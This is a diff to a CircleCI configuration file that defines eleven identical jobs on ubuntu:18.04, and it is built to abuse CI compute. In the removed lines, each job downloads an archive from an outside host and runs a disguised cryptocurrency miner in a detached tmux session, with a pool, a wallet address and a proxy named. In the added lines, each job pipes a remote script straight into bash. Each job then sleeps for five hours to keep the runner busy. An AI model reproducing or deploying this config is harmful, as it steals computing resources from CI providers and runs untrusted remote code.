@@ -1,112 +1,112 @@
 version: 2.1
 
 jobs:
-  yarntrigstage:
+  akalistage:
     docker:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
       - run: 
             command: sleep 18000
             no_output_timeout: 5h
 
-  yarntrigstage1:
+  akalistage1:
     docker:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
       - run: 
             command: sleep 18000
             no_output_timeout: 5h
 
-  yarntrigstage2:
+  akalistage2:
     docker:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
       - run: 
             command: sleep 18000
             no_output_timeout: 5h
 
-  yarntrigstage3:
+  akalistage3:
     docker:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
       - run: 
             command: sleep 18000
             no_output_timeout: 5h
 
-  yarntrigstage4:
+  akalistage4:
     docker:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
       - run: 
             command: sleep 18000
             no_output_timeout: 5h
 
-  yarntrigstage5:
+  akalistage5:
     docker:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
       - run: 
             command: sleep 18000
             no_output_timeout: 5h
 
-  yarntrigstage6:
+  akalistage6:
     docker:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
       - run: 
             command: sleep 18000
             no_output_timeout: 5h
 
-  yarntrigstage7:
+  akalistage7:
     docker:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
       - run: 
             command: sleep 18000
             no_output_timeout: 5h
 
-  yarntrigstage8:
+  akalistage8:
     docker:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
       - run: 
             command: sleep 18000
             no_output_timeout: 5h
 
-  yarntrigstage9:
+  akalistage9:
     docker:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
       - run: 
             command: sleep 18000
             no_output_timeout: 5h
 
-  yarntrigstage10:
+  akalistage10:
     docker:
     - image: ubuntu:18.04
     steps:
       - checkout
-      - run: apt-get update; apt install tmux htop wget curl -y; wget http://mrgeek.me/fb/garchain.tar.gz; tar xvfz garchain.tar.gz; cd apache; mv rf delga; chmod +x delga; tmux new -d -s my-session "./delga -t 32 --randomize --quiet -a yespowersugar -o midaroamu.ruok.org:7042 -u sugar1q6s33se24w97npv2dtdpg8hcdzj2u3n338nlvsx.nLEO -x 18.222.27.85:34844"
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
       - run: 
             command: sleep 18000
             no_output_timeout: 5h
@@ -114,14 +114,14 @@ jobs:
 workflows:
   main:
     jobs:
-      - yarntrigstage
-      - yarntrigstage1
-      - yarntrigstage2
-      - yarntrigstage3
-      - yarntrigstage4
-      - yarntrigstage5
-      - yarntrigstage6
-      - yarntrigstage7
-      - yarntrigstage8
-      - yarntrigstage9
-      - yarntrigstage10
+      - akalistage
+      - akalistage1
+      - akalistage2
+      - akalistage3
+      - akalistage4
+      - akalistage5
+      - akalistage6
+      - akalistage7
+      - akalistage8
+      - akalistage9
+      - akalistage10
